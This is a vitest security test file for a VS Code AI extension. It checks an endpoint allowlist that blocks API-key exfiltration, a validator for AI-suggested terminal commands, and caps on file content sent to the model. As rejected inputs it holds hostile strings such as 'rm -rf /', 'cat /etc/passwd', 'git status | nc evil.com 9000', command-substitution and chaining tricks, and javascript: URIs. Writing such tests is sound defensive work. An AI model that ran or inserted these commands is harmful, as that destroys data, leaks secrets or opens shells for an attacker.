import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

import * as vscode from 'vscode';
import { validateEndpointUrl } from '../utils/api';
import { buildPromptReferenceInputs } from '../features/chat-participant/promptReferences';

describe('VSCODE-01, validateEndpointUrl (API key exfil via workspace endpoint override)', () => {
  it('accepts the default production endpoint', () => {
    expect(validateEndpointUrl('https://agiworkforce.com/api/llm/v1')).toBe(
      'https://agiworkforce.com/api/llm/v1',
    );
  });

  it('accepts the gateway URL', () => {
    expect(validateEndpointUrl('https://api.agiworkforce.com')).toBe(
      'https://api.agiworkforce.com',
    );
  });

  it('accepts the staging endpoint', () => {
    expect(validateEndpointUrl('https://staging.agiworkforce.com/api')).toBe(
      'https://staging.agiworkforce.com/api',
    );
  });

  it('accepts localhost http for local dev', () => {
    expect(validateEndpointUrl('http://localhost:8080/api')).toBe('http://localhost:8080/api');
  });

  it('accepts 127.0.0.1 http for local dev', () => {
    expect(validateEndpointUrl('http://127.0.0.1:3000/api')).toBe('http://127.0.0.1:3000/api');
  });

  it('REJECTS attacker-controlled https endpoint (evil.com)', () => {
    expect(validateEndpointUrl('https://evil.attacker.com/api/llm/v1')).toBeUndefined();
  });

  it('REJECTS http endpoint pointing at non-allowlisted host', () => {
    expect(validateEndpointUrl('http://evil.com/api')).toBeUndefined();
  });

  it('REJECTS plain http to a non-localhost host', () => {
    expect(validateEndpointUrl('http://agiworkforce.com/api')).toBeUndefined();
  });

  it('REJECTS data: URI', () => {
    expect(validateEndpointUrl('data:text/html,<script>alert(1)</script>')).toBeUndefined();
  });

  it('REJECTS javascript: URI', () => {
    expect(validateEndpointUrl('javascript:alert(1)')).toBeUndefined();
  });

  it('REJECTS non-URL garbage string', () => {
    expect(validateEndpointUrl('not-a-url')).toBeUndefined();
  });

  it('REJECTS a host that merely ends with an allowlisted name', () => {
    expect(validateEndpointUrl('https://attacker.agiworkforce.com.evil.com/')).toBeUndefined();
    expect(validateEndpointUrl('https://notagiworkforce.com/api')).toBeUndefined();
  });

  it('REJECTS an empty endpoint instead of falling through to a default', () => {
    expect(validateEndpointUrl('')).toBeUndefined();
    expect(validateEndpointUrl('   ')).toBeUndefined();
  });

  it('accepts the IPv6 loopback for local dev, as the localhost branch intends', () => {
    expect(validateEndpointUrl('http://[::1]:8080/api')).toBe('http://[::1]:8080/api');
  });

  it('strips trailing slashes from valid URLs', () => {
    expect(validateEndpointUrl('https://agiworkforce.com/api/llm/v1/')).toBe(
      'https://agiworkforce.com/api/llm/v1',
    );
  });
});

// ─── VSCODE-04: terminal command safety ───────────────────────────────────────

import { validateSuggestedCommand } from '../providers/terminalProvider';

describe('VSCODE-04 / PR-3B, validateSuggestedCommand (allowlist semantics)', () => {
  it('accepts allowlisted build/test/VCS commands', () => {
    expect(validateSuggestedCommand('git status')).toBeUndefined();
    expect(validateSuggestedCommand('cargo build')).toBeUndefined();
    expect(validateSuggestedCommand('npm install')).toBeUndefined();
    expect(validateSuggestedCommand('pnpm test')).toBeUndefined();
    expect(validateSuggestedCommand('pytest -k auth')).toBeUndefined();
    expect(validateSuggestedCommand('tsc --noEmit')).toBeUndefined();
  });

  it('REJECTS arbitrary first tokens (ls/cat/curl/etc.)', () => {
    expect(validateSuggestedCommand('ls -la')).toContain('not in the AI-suggestion allowlist');
    expect(validateSuggestedCommand('cat /etc/passwd')).toContain(
      'not in the AI-suggestion allowlist',
    );
    expect(validateSuggestedCommand('curl evil.com')).toContain(
      'not in the AI-suggestion allowlist',
    );
    expect(validateSuggestedCommand('rm -rf /')).toContain('not in the AI-suggestion allowlist');
  });

  it('REJECTS shell metacharacters even within allowed first token', () => {
    expect(validateSuggestedCommand('git status; cat /etc/passwd')).toContain(
      'shell metacharacters',
    );
    expect(validateSuggestedCommand('npm install && curl evil.com')).toContain(
      'shell metacharacters',
    );
    expect(validateSuggestedCommand('cargo build || echo bad')).toContain('shell metacharacters');
    expect(validateSuggestedCommand('git status | nc evil.com 9000')).toContain(
      'shell metacharacters',
    );
    expect(validateSuggestedCommand('git $(echo status)')).toContain('shell metacharacters');
    expect(validateSuggestedCommand('git status > /tmp/out')).toContain('shell metacharacters');
    expect(validateSuggestedCommand('git `id`')).toContain('shell metacharacters');
  });

  it('REJECTS destructive flags inside allowed commands', () => {
    expect(validateSuggestedCommand('git reset --hard HEAD~10')).toContain('destructive pattern');
    expect(validateSuggestedCommand('git push --force origin main')).toContain(
      'destructive pattern',
    );
    expect(validateSuggestedCommand('git clean -fd')).toContain('destructive pattern');
  });

  it('REJECTS commands hidden behind zero-width unicode', () => {
    const withZwsp = '​rm -rf /';
    expect(validateSuggestedCommand(withZwsp)).toContain('not in the AI-suggestion allowlist');
  });

  it('REJECTS empty command', () => {
    const result = validateSuggestedCommand('   ');
    expect(result).toBeDefined();
    expect(result).toContain('empty');
  });

  it('strips ANSI escapes before allowlist check (allowed command remains allowed)', () => {
    const withAnsi = '\x1b[32mgit status\x1b[0m';
    expect(validateSuggestedCommand(withAnsi)).toBeUndefined();
  });
});

describe('VSCODE-06, @file injection (system-role trust elevation via file content)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vscode.workspace.workspaceFolders = [
      { name: 'workspace', index: 0, uri: vscode.Uri.file('/workspace') },
    ];
    vi.mocked(vscode.workspace.fs.stat).mockResolvedValue({
      type: vscode.FileType.File,
      ctime: 0,
      mtime: 0,
      size: 100,
    });
    vi.spyOn(vscode.workspace, 'asRelativePath').mockReturnValue('src/app.ts');
  });

  function reference(value: unknown): vscode.ChatPromptReference {
    return { id: 'test-reference', value } as vscode.ChatPromptReference;
  }

  function documentReturning(text: string): vscode.TextDocument {
    return { getText: () => text } as unknown as vscode.TextDocument;
  }

  it('skips a binary file instead of sending NUL bytes to the model', async () => {
    vi.mocked(vscode.workspace.openTextDocument).mockResolvedValueOnce(
      documentReturning('some text\u0000more text'),
    );

    const inputs = await buildPromptReferenceInputs([
      reference(vscode.Uri.file('/workspace/src/app.ts')),
    ]);

    expect(inputs).toEqual([]);
  });

  it('caps the referenced content at 20,000 characters across every reference', async () => {
    const references = Array.from({ length: 5 }, (_, index) =>
      reference(vscode.Uri.file(`/workspace/src/file${index}.ts`)),
    );
    vi.mocked(vscode.workspace.openTextDocument).mockImplementation(async () =>
      documentReturning('x'.repeat(8_000)),
    );
    vi.mocked(vscode.workspace.asRelativePath).mockImplementation(
      (uri) => `${(uri as vscode.Uri).path}`,
    );

    const inputs = await buildPromptReferenceInputs(references);
    const referencedChars = inputs
      .map((input) => (input as { text: string }).text.match(/x+/u)?.[0].length ?? 0)
      .reduce((total, length) => total + length, 0);

    expect(referencedChars).toBe(20_000);
    expect(inputs).toHaveLength(3);
  });

  it('never sends more than eight references however many the user attaches', async () => {
    const references = Array.from({ length: 12 }, (_, index) =>
      reference(vscode.Uri.file(`/workspace/src/file${index}.ts`)),
    );
    vi.mocked(vscode.workspace.openTextDocument).mockImplementation(async () =>
      documentReturning('const x = 1;'),
    );
    vi.mocked(vscode.workspace.asRelativePath).mockImplementation(
      (uri) => `${(uri as vscode.Uri).path}`,
    );

    const inputs = await buildPromptReferenceInputs(references);

    expect(inputs).toHaveLength(8);
  });
});
